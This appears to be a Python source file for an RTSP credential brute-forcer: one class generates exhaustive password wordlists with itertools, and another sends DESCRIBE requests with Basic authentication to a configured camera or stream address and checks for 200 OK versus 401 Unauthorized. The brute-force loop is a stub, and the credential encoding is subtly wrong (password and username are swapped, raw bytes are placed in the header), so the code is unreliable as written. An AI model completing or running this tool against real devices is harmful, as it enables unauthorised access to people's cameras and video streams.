import base64
import itertools
import os
import socket
import threading
import time
from pathlib import Path

from config import Config


class PasswordGenerator:
    def __init__(self):
        self.config = Config()
        self.characters = self.config.characters
        self.digits = self.config.digits
        self.symbols = self.config.symbols
        self.length = self.config.length

    def password_gen_orch(self):
        threads = []
        for i in range(self.config.length['start'], self.config.length['end'] + 1):
            t = threading.Thread(target=self.worker, args=(i,))
            threads.append(t)
            t.start()

    def worker(self, i, config=Config()):
        bulker = []
        print(f"Start {i}")
        for item in itertools.product(config.characters + config.digits + config.symbols, repeat=i):
            password = "".join(item)
            # print(password)
            # if password == '28d@':
            #     return True
            if len(bulker) >= config.bulker_len:
                self.save_passwords_file(bulker, config, i)
                bulker = []
            bulker.append(password)
        print(f"Done {i}")

    def save_passwords_file(self, bulker, config, i):
        output_file = Path(os.path.join(config.passwords_dir, f'passwords_{i}.txt'))
        output_file.parent.mkdir(exist_ok=True, parents=True)
        with open(output_file, 'a') as f:
            for s in bulker:
                f.write(f'{s}\n')


class RTSPBruteForce:
    def __init__(self):
        self.config = Config()
        self.characters = self.config.characters
        self.digits = self.config.digits
        self.symbols = self.config.symbols
        self.length = self.config.length

    def digest_response(self, response):
        if '200 OK' in str(response):
            return True, '200 OK'
        elif '401 Unauthorized' in str(response):
            return False, '401 Unauthorized'
        else:
            return False, response

    def base64encode(self):
        username = self.config.rtsp_username
        password = self.config.rtsp_password
        credentials = f'{password}:{username}'
        credentials_bytes = credentials.encode('ascii')
        base64_bytes = base64.b64encode(credentials_bytes)
        return base64_bytes

    def get_pass_files(self):
        passwords = os.listdir(self.config.passwords_dir)
        return passwords


    def brute_force_rtsp(self):
        files = self.get_pass_files()
        for file in files:
            print(file)
            pass



    def create_conn(self):
        try:
            b64 = self.base64encode()
            dest = f"DESCRIBE rtsp://{self.config.rtsp_ip}:{self.config.rtsp_port}/unicast RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {b64}\r\n\r\n"
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.config.rtsp_ip, self.config.rtsp_port))
            s.send(dest.encode())
            response = s.recv(512)
            print(self.digest_response(response))
        except socket.error as e:
            print(e)
        except (ConnectionRefusedError, ConnectionResetError) as e:
            print(
                f'{e}: {self.config.rtsp_ip}:{self.config.rtsp_port} - {self.config.rtsp_username}:{self.config.rtsp_password}')
        except Exception as e:
            print(e)
